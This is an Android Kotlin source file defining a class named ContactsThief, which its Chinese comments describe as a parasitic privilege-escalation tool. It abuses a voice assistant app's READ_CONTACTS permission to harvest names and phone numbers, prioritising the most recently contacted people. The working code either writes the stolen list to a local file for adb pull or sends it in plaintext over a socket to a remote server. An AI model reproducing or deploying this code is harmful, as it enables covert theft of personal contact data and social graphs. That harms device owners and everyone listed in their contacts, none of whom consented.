package xyz.mufanc.vap.util

import android.content.ContentResolver
import android.database.Cursor
import android.provider.ContactsContract
import org.json.JSONArray
import org.json.JSONObject
import java.io.BufferedOutputStream
import java.io.File
import java.net.Socket

/**
 * 寄生提权：通讯录窃取工具
 * 利用 VoiceAssist 的 READ_CONTACTS 权限获取社交关系拓扑图。
 */
class ContactsThief {

    companion object {
        private const val TAG = "ContactsThief"

        // Android 标准联系人电话数据的 URI
        private val CONTACTS_URI = ContactsContract.CommonDataKinds.Phone.CONTENT_URI

        // 字段：显示名称、电话号码、最后联系时间
        private const val COLUMN_NAME = ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME
        private const val COLUMN_NUMBER = ContactsContract.CommonDataKinds.Phone.NUMBER
        private const val COLUMN_LAST_CONTACTED = ContactsContract.CommonDataKinds.Phone.LAST_TIME_CONTACTED
    }

    /**
     * 窃取联系人并保存到设备本地文件（USB 模式，供 adb pull）
     */
    fun stealToFile(outputPath: String, limit: Int = 100): Int {
        return try {
            val contactsArray = queryContacts(limit)
            File(outputPath).writeText(contactsArray.toString(4))
            Log.i(TAG, "Plaintext contacts data written to $outputPath")
            contactsArray.length()
        } catch (e: Exception) {
            Log.e(TAG, "Failed to write contacts file", e)
            0
        }
    }

    /**
     * 窃取联系人并通过 socket 回传（WiFi 模式）
     */
    fun stealToSocket(serverAddress: String, serverPort: Int, limit: Int = 100): Int {
        return try {
            val contactsArray = queryContacts(limit)
            val socket = Socket(serverAddress, serverPort)
            val outputStream = BufferedOutputStream(socket.getOutputStream())
            val payload = contactsArray.toString().toByteArray(Charsets.UTF_8)

            outputStream.write(payload)
            outputStream.flush()
            socket.shutdownOutput()

            outputStream.close()
            socket.close()

            Log.i(TAG, "Plaintext contacts sent to $serverAddress:$serverPort")
            contactsArray.length()
        } catch (e: Exception) {
            Log.e(TAG, "Failed to exfiltrate contacts", e)
            0
        }
    }

    private fun queryContacts(limit: Int): JSONArray {
        val contactsArray = JSONArray()
        val resolver: ContentResolver = Ctx.app.contentResolver

        var cursor: Cursor? = null
        try {
            // 按最后联系时间降序，优先提取高频/最近联系的亲密人员
            cursor = resolver.query(
                CONTACTS_URI,
                arrayOf(COLUMN_NAME, COLUMN_NUMBER, COLUMN_LAST_CONTACTED),
                null,
                null,
                "$COLUMN_LAST_CONTACTED DESC LIMIT $limit"
            )

            if (cursor == null) {
                Log.w(TAG, "Cursor is null, failed to read contacts")
                return contactsArray
            }

            val nameIdx = cursor.getColumnIndex(COLUMN_NAME)
            val numberIdx = cursor.getColumnIndex(COLUMN_NUMBER)

            while (cursor.moveToNext()) {
                val rawName = if (nameIdx != -1) cursor.getString(nameIdx) else ""
                val rawNumber = if (numberIdx != -1) cursor.getString(numberIdx) else ""

                val contactObj = JSONObject()
                contactObj.put("name", rawName)
                contactObj.put("number", rawNumber)
                contactsArray.put(contactObj)
            }

            Log.i(TAG, "Successfully extracted ${contactsArray.length()} plaintext contacts")
        } catch (e: Exception) {
            Log.e(TAG, "Error while stealing contacts", e)
        } finally {
            cursor?.close()
        }

        return contactsArray
    }
}
